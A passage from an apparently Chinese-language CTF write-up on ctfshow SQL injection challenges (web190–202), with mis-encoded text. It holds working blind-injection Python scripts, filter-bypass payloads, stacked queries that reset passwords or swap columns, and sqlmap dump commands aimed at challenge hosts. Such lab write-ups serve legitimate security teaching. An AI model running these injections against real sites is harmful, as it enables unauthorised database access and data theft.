&#125;&#x2F;&#x2F;TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</code></pre><p>ç›²æ³¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509225707786.png" alt="image-20220509225707786"></p><p>åº•ä¸‹è¿™ä¸ªå›¾åº”è¯¥ä¹Ÿç”¨oræµ‹çš„ï¼Œæ‡’å¾—å†æˆªå›¾äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509225602279.png" alt="image-20220509225602279"></p><p>å¯ä»¥çœ‹åˆ°æ­£ç¡®çš„æ—¶å€™è¿”å›å¯†ç é”™è¯¯ï¼Œé”™è¯¯çš„æ—¶å€™è¿”å›ç”¨æˆ·åä¸å­˜åœ¨ï¼Œæ‰€ä»¥ç›´æ¥ç›²æ³¨å°±è¡Œäº†</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;6&#x2F;1 21:57# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e4bfc493-4ed3-4091-99b3-e1770febcde1.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;data &#x3D; &#123;&#39;username&#39;:&#39;&#39;,        &#39;password&#39;:123456&#125;flag &#x3D; &#39;&#39;for i in range(1,46):    start &#x3D; 32    end &#x3D; 127    while start &lt; end:        mid &#x3D; (start + end) &gt;&gt; 1        #å–è¡¨åï¼špayload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        #å–å­—æ®µåï¼špayload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;&quot;        payload &#x3D; &quot;select f1ag from ctfshow_fl0g&quot;        data[&#39;username&#39;] &#x3D; f&quot;admin&#39; and if(ascii(substr((&#123;payload&#125;), &#123;i&#125; , 1)) &gt; &#123;mid&#125;, 1, 2)&#x3D;1#&quot;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;å¯†ç é”™è¯¯&quot; in res.json()[&#39;msg&#39;]:            start &#x3D; mid +1        else:            end &#x3D; mid    flag &#x3D; flag + chr(start)    print(flag)</code></pre><h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯†ç æ£€æµ‹if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;å¯†ç åˆ¤æ–­if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç™»é™†æˆåŠŸ&#39;;  &#125;&#x2F;&#x2F;TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª  if(preg_match(&#39;&#x2F;file|into|ascii&#x2F;i&#39;, $username))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;      die(json_encode($ret));  &#125;    </code></pre><p>åŠ äº†ä¸ªè¿‡æ»¤ï¼Œasciiè¢«è¿‡æ»¤äº†ï¼Œæœ€ç®€å•çš„å°±æ˜¯ä¸ç”¨äºŒåˆ†æ³•ç›´æ¥éå†æ¯”è¾ƒï¼ˆ</p><p>æŠŠasciiæ¢æˆord</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;6&#x2F;2 17:03# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;d0f3a387-5d85-4a5c-a4b8-2267077de55f.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;data &#x3D; &#123;&#39;username&#39;:&#39;&#39;,        &#39;password&#39;:123456&#125;flag &#x3D; &#39;&#39;for i in range(1,46):    start &#x3D; 32    end &#x3D; 127    while start &lt; end:        mid &#x3D; (start + end) &gt;&gt; 1        #å–è¡¨åï¼špayload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        #å–å­—æ®µåï¼špayload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;&quot;        payload &#x3D; &quot;select f1ag from ctfshow_fl0g&quot;        data[&#39;username&#39;] &#x3D; f&quot;admin&#39; and if(ord(substr((&#123;payload&#125;), &#123;i&#125; , 1)) &gt; &#123;mid&#125;, 1, 2)&#x3D;1#&quot;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;å¯†ç é”™è¯¯&quot; in res.json()[&#39;msg&#39;]:            start &#x3D; mid +1        else:            end &#x3D; mid    flag &#x3D; flag + chr(start)    print(flag)</code></pre><h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯†ç æ£€æµ‹if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;å¯†ç åˆ¤æ–­if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç™»é™†æˆåŠŸ&#39;;  &#125;&#x2F;&#x2F;TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex&#x2F;i&#39;, $username))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;      die(json_encode($ret));  &#125;</code></pre><p>ord ascii hexéƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯ç›´æ¥éå†å§ï¼ˆ</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;6&#x2F;2 17:03# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;185fcade-247d-4a43-a4fc-5cd023f84184.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;flag &#x3D; &quot;&quot;all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;for i in range(1,99):    for j in all_str:        payload &#x3D; &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;        username_data &#x3D; f&quot;admin&#39; and if(substr((&#123;payload&#125;), &#123;i&#125;, 1)regexp(&#39;&#123;j&#125;&#39;), 1, 0)&#x3D;1#&quot;        data &#x3D; &#123;&#39;username&#39;: username_data,                &#39;password&#39;: 1&#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;å¯†ç é”™è¯¯&quot; in res.json()[&#39;msg&#39;]:            flag +&#x3D; j            print(flag)            break        if j &#x3D;&#x3D; &quot;&#125;&quot;:            exit()</code></pre><p>è¿™é‡Œæˆ‘è§‰å¾—ç­‰äºå·æ²¡è¢«è¿‡æ»¤çš„è¯ç›´æ¥æ¯”è¾ƒçœ‹èµ·æ¥ä¼šæ›´ç®€å•ä¸€ç‚¹</p><h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯†ç æ£€æµ‹if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;å¯†ç åˆ¤æ–­if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç™»é™†æˆåŠŸ&#39;;  &#125;&#x2F;&#x2F;TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr&#x2F;i&#39;, $username))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;      die(json_encode($ret));  &#125;</code></pre><p>substrä¹Ÿæ²¡äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨leftã€rightã€midã€locateã€substringä»£æ›¿</p><pre class="language-none"><code class="language-none">left(&quot;abc&quot;,2)è¿”å›ä»å·¦è¾¹ç¬¬ä¸€ä¸ªå¼€å§‹ä¸¤ä¸ªå­—ç¬¦&quot;ab&quot;</code></pre><pre class="language-none"><code class="language-none">locate(&quot;ab&quot;,&quot;abxx&quot;)è¿”å›ç¬¬ä¸€ä¸ªå‚æ•°åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¸­å‡ºç°çš„ä½ç½®ï¼Œä»1å¼€å§‹è®¡æ•°</code></pre><p>locateï¼š</p><pre class="language-none"><code class="language-none">import timeimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;bd4fa184-8dec-427e-943d-762e0ed0deb9.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;flagstr_full &#x3D; &quot;0123456789-&#125;qwertyuiopasdfghjklzxcvbnm&#123;,_&quot;flagstr &#x3D; &quot;1234567890&#123;-&#125;abcdef&quot;flag &#x3D; &quot;ctfshow&quot;payload &#x3D; r&quot;&#39; or if(locate(&#39;&#123;&#125;&#39;,(select group_concat(f1ag) from ctfshow_flxg)),1,0) &#x3D;&#39;1&quot;for i in range(60):    for j in flagstr:        tj &#x3D; flag+j        data &#x3D; &#123;            &quot;username&quot;:payload.format(tj),            &quot;password&quot;:&quot;0&quot;        &#125;        res &#x3D; requests.post(url , data &#x3D; data)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:            flag +&#x3D; j            print(flag)        time.sleep(0.3)</code></pre><p>leftï¼š</p><pre class="language-none"><code class="language-none">import timeimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;328932d3-030e-460a-923e-6003243856d4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;flagstr &#x3D; &quot;0123456789-&#125;qwertyuiopasdfghjklzxcvbnm&#123;,_&quot;flag &#x3D; &quot;&quot;payload &#x3D; r&quot;&#39; or if(left((select group_concat(f1ag) from ctfshow_flxg), &#123;&#125;)regexp(&#39;&#123;&#125;&#39;),1,0) &#x3D;&#39;1&quot;for i in range(60):    for j in flagstr:        tj &#x3D; flag+j        data &#x3D; &#123;            &quot;username&quot;:payload.format(str(i),tj),            &quot;password&quot;:&quot;0&quot;        &#125;        res &#x3D; requests.post(url , data &#x3D; data)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:            flag +&#x3D; j            print(flag)        time.sleep(0.3)</code></pre><p>è¿˜å¯ä»¥åˆ©ç”¨likeçš„æ¨¡ç³ŠåŒ¹é…å’Œregexpçš„æ­£åˆ™</p><p>regexpæ­£åˆ™ï¼š</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;6&#x2F;11 14:03# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;4c28d2d4-bcae-4e08-9e24-dfa0cb694305.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;flag &#x3D; &quot;&quot;all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-,_&#123;&#125;&quot;for i in range(1,99):    for j in all_str:        #payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        #payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;&quot;        payload &#x3D; &quot;select group_concat(f1ag) from ctfshow_flxg&quot;        username_data &#x3D; &quot;admin&#39; and if((&#123;0&#125;)regexp(&#39;^&#123;1&#125;&#39;), 1, 0)&#x3D;1#&quot;.format(payload, flag + j)        data &#x3D; &#123;&#39;username&#39;: username_data,                &#39;password&#39;: 1&#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        #print(data)        if &quot;å¯†ç é”™è¯¯&quot; in res.json()[&#39;msg&#39;]:            flag +&#x3D; j            print(flag)            break        if j &#x3D;&#x3D; &quot;&#125;&quot;:            exit()</code></pre><p>likeï¼š</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;618941b4-ab0f-43e2-83ce-01afe487708c.challenge.ctf.show&#x2F;api&#x2F;&quot;flag &#x3D; &quot;&quot;table &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;for i in range(1,99):    for j in table:        pay &#x3D; flag+j+&#39;%&#39;        username_data &#x3D; f&quot;&#39; or if((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        data &#x3D; &#123;&#39;username&#39;: username_data,                &#39;password&#39;: 1&#125;        r &#x3D; requests.post(url&#x3D;url, data&#x3D;data).text        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in r:            flag +&#x3D; j            print(flag)            if j &#x3D;&#x3D; &quot;&#125;&quot;:                exit()            break</code></pre><h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>è¿”å›é€»è¾‘reg</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯†ç æ£€æµ‹if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;å¯†ç åˆ¤æ–­if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç™»é™†æˆåŠŸ&#39;;  &#125;&#x2F;&#x2F;TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr|char|left|right|substring&#x2F;i&#39;, $username))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;      die(json_encode($ret));  &#125;</code></pre><p>likeçš„æ¨¡ç³ŠåŒ¹é…ï¼Œregexpçš„æ­£åˆ™è¿˜æœ‰midã€locateä¹‹ç±»çš„éƒ½èƒ½ç”¨</p><h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯†ç æ£€æµ‹if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;å¯†ç åˆ¤æ–­if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç™»é™†æˆåŠŸ&#39;;  &#125;&#x2F;&#x2F;TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr|char|left|right|substring&#x2F;i&#39;, $username))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;      die(json_encode($ret));  &#125;</code></pre><p>è¿™é‡Œæ˜¯å †å æ³¨å…¥ï¼Œåœ¨æˆ‘è¿˜æƒ³çˆ†å­—æ®µçš„æ—¶å€™ï¼Œå¤§å¸ˆå‚…ä»¬å·²ç»ç”¨updateæŠŠå¯†ç æ”¹äº†ç›´æ¥ç™»å½•äº†</p><p>UPDATEç”¨æ³•</p><pre class="language-none"><code class="language-none">UPDATE è¡¨åç§° SET åˆ—åç§° &#x3D; æ–°å€¼ WHERE åˆ—åç§° &#x3D; æŸå€¼Copy</code></pre><p>ä½¿ç”¨updateä¿®æ”¹å¯†ç </p><pre class="language-none"><code class="language-none">0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1</code></pre><p>ä¸è¿‡è¯•äº†ä¸€ä¸‹å‘ç°å¥½åƒä¹ŸæŸ¥ä¸äº†å­—æ®µï¼Œè¿‡æ»¤çš„æœ‰ç‚¹å¤šï¼Œè¦æŸ¥æ„Ÿè§‰åªèƒ½ç›²æ³¨</p><p>payload</p><pre class="language-sq" data-language="sq"><code class="language-sq">0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509232642673.png" alt="image-20220509232642673"></p><p>å—æ–¹å¸ˆå‚…å’Œy4å¸ˆå‚…éƒ½è¯´å› ä¸º<code>  $sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;;</code>è¿™ä¸ªè¯­å¥æ²¡å¼•å·æ‰€ä»¥è¦ç”¨åå…­è¿›åˆ¶</p><p>æ‰€ä»¥ä»–ä»¬çš„payloadéƒ½æ˜¯ä¸‹é¢è¿™ç§å½¢å¼</p><pre class="language-none"><code class="language-none">payload&#x3D;&quot;0x61646d696e;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;0x313131;&quot;</code></pre><p>è€Œæˆ‘è¿™é‡Œæ²¡æœ‰ç”¨åå…­è¿›åˆ¶è€Œæ˜¯0çš„åŸå› åœ¨web188é‡Œ</p><h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§if(preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into&#x2F;i&#39;, $username))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;  die(json_encode($ret));&#125;if(strlen($username)&gt;16)&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åä¸èƒ½è¶…è¿‡16ä¸ªå­—ç¬¦&#39;;  die(json_encode($ret));&#125;if($row[0]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&quot;ç™»é™†æˆåŠŸ flag is $flag&quot;;&#125;    </code></pre><p>é™åˆ¶äº†ç”¨æˆ·åé•¿åº¦ï¼Œä¸Šä¸€é¢˜çš„payloadä¸èƒ½ç”¨äº†</p><p>è¿™é‡Œå¥½åƒæ˜¯åç«¯éªŒè¯æœ‰é—®é¢˜ï¼Œselectæ²¡è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">username &#x3D; 0;select(1)password &#x3D; 1</code></pre><p>å› ä¸º</p><pre class="language-sql" data-language="sql"><code class="language-sql">select pass from ctfshow_user where username &#x3D; 0;</code></pre><p>æ˜¾ç„¶ä¸ä¼šæˆç«‹ï¼Œæ‰€ä»¥æŸ¥è¯¢åä¼šè¿”å›åé¢çš„è¯­å¥ç»“æœï¼Œè€Œselect(1)è¿”å›çš„ç»“æœæ˜¯1ï¼Œæ‰€ä»¥è¿™æ—¶åªè¦å¯†ç æ˜¯1å°±èƒ½ç™»é™†æˆåŠŸ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510112512012.png" alt="image-20220510112512012"></p><h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set&#x2F;&#x2F;i&#39;, $username))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;  die(json_encode($ret));&#125;if($row[0]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&quot;ç™»é™†æˆåŠŸ flag is $flag&quot;;&#125;   </code></pre><p>selectï¼Œupdateï¼Œsetè¢«è¿‡æ»¤äº†</p><p>ä½†æ˜¯showæ²¡æœ‰ï¼Œç»“åˆæŸ¥è¯¢è¯­å¥æˆ‘ä»¬èƒ½çŸ¥é“è¡¨åæ˜¯ctfshow_user</p><p>æ‰€ä»¥å¯ä»¥æ„é€ payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">username &#x3D; 0;show tablespassword &#x3D; ctfshow_user</code></pre><h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><p>197çš„payloadè¿˜èƒ½ç”¨</p><p>å—æ–¹å¸ˆå‚…è¿˜å†™äº†å¦ä¸€ç§æ€è·¯</p><p>è¿™é‡Œæ²¡æœ‰banæ‰alterï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå¯†ç å’Œidä¸¤åˆ—è¿›è¡Œä¸€ä¸ªäº’æ¢ï¼Œè¿™æ ·ä¸€æ¥åˆ¤æ–­flagçš„æ¡ä»¶å˜æˆå¯¹idçš„æ£€æµ‹ï¼Œè€Œidéƒ½æ˜¯çº¯æ•°å­—ï¼Œæˆ‘ä»¬å¯ä»¥å»è¿›è¡Œçˆ†ç ´åˆ°æ­£ç¡®çš„idï¼Œä»è€Œè·å¾—flagï¼Œè„šæœ¬å¦‚ä¸‹</p><pre class="language-none"><code class="language-none">PYTHON#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;6&#x2F;15 22:53# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e36a9275-a8a8-4def-bce5-0988a2b9b81d.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;payload &#x3D; &#39;0x61646d696e;alter table ctfshow_user change column &#96;pass&#96; &#96;dotast&#96; varchar(255);alter table ctfshow_user change column &#96;id&#96; &#96;pass&#96; varchar(255);alter table ctfshow_user change column &#96;dotast&#96; &#96;id&#96; varchar(255);&#39;data1 &#x3D; &#123;    &#39;username&#39;: payload,    &#39;password&#39;: &#39;1&#39;&#125;res &#x3D; requests.post(url&#x3D;url, data&#x3D;data1)for i in range(99):    data2 &#x3D; &#123;        &#39;username&#39;: &quot;0x61646d696e&quot;,        &#39;password&#39;: f&#39;&#123;i&#125;&#39;    &#125;    res2 &#x3D; requests.post(url&#x3D;url, data&#x3D;data2)    if &quot;flag&quot; in res2.json()[&#39;msg&#39;]:        print(res2.json()[&#39;msg&#39;])        break</code></pre><h2 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h2><p>web197çš„payloadæˆ–è€…ç”¨198å†™çš„è„šæœ¬</p><h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>ä»è¿™ä¹‹åçš„å‡ é“é¢˜éƒ½æ˜¯sqlmapçš„ä½¿ç”¨</p><p><a href="https://blog.csdn.net/Dome_/article/details/104337211">Sqlmapå¸¸è§å‘½ä»¤_K&#39;illCodeçš„åšå®¢-CSDNåšå®¢</a></p><pre class="language-none"><code class="language-none">[ sqlmapæœ€æ–°ç‰ˆä¸‹è½½](https:&#x2F;&#x2F;ctfshow.lanzoui.com&#x2F;i4wlziac1de) ä½¿ç”¨--user-agent æŒ‡å®šagent ä½¿ç”¨--referer ç»•è¿‡refereræ£€æŸ¥</code></pre><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤  function waf($str)&#123;   &#x2F;&#x2F;ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º  &#125;</code></pre><p>é¢˜ç›®ä¸Šéƒ½å†™äº†</p><pre class="language-txt" data-language="txt"><code class="language-txt">ä½¿ç”¨--user-agent æŒ‡å®šagentä½¿ç”¨--referer ç»•è¿‡refereræ£€æŸ¥</code></pre><p>æŠ“ä¸€ä¸‹åŒ…æ‰¾åˆ°æŸ¥è¯¢çš„apiæ¥å£</p><p>ç„¶årefererè¦ä¸ºctf.show</p><pre class="language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;929912ab-39c5-48ee-8cbe-bbc3e4562124.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot;  --referer&#x3D;&quot;http:&#x2F;&#x2F;929912ab-39c5-48ee-8cbe-bbc3e4562124.challenge.ctf.show&quot; --dump --batch --no-cast ----dump             è½¬å‚¨æ•°æ®åº“è¡¨é¡¹,æŸ¥è¯¢å­—æ®µå€¼-session</code></pre><pre class="language-txt" data-language="txt"><code class="language-txt">--no-cast  è·å–æ•°æ®æ—¶ï¼Œsqlmapä¼šå°†æ‰€æœ‰æ•°æ®è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå¹¶ç”¨ç©ºæ ¼ä»£æ›¿nullã€‚(è¿™ä¸ªåœ¨æˆ‘ä»¬æ³¨å…¥å¤±è´¥çš„æ—¶å€™å¶å°”ä¼šè§åˆ°ï¼Œæç¤ºå°è¯•ä½¿ç”¨--no-cast)--dump             è½¬å‚¨æ•°æ®åº“è¡¨é¡¹,æŸ¥è¯¢å­—æ®µå€¼--batch&#x2F;&#x2F;è‡ªåŠ¨é€‰æ‹©é€‰é¡¹--flush-sessionsqlmapæ‰«æçš„æ—¶å€™ä¼šå°†ç¼“å­˜çš„æ•°æ®è®°å½•åˆ°outputæ–‡ä»¶ä¸‹ï¼Œä¸‹æ¬¡æ‰«ææ—¶ä¼šç›´æ¥è°ƒç”¨æœ¬åœ°ç¼“å­˜çš„æ‰«æç»“æœã€‚å¦‚æœæˆ‘ä»¬æƒ³åˆ é™¤ç¼“å­˜ç»“æœï¼Œé‡æ–°å¯¹æŸç½‘ç«™è¿›è¡Œæ‰«æå°±éœ€è¦æ·»åŠ --flush-sessioné€‰é¡¹ã€‚</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510161320437.png" alt="image-20220510161320437"></p><p>å¦‚æœæ˜¯ä¸€æ­¥ä¸€æ­¥çš„æŸ¥ï¼Œé‚£payloadåº”è¯¥æ˜¯</p><pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;50a4f61e-b424-4597-b92c-c768d2ee4089.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</code></pre><h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><blockquote><p>ä½¿ç”¨--data è°ƒæ•´sqlmapçš„è¯·æ±‚æ–¹å¼</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code 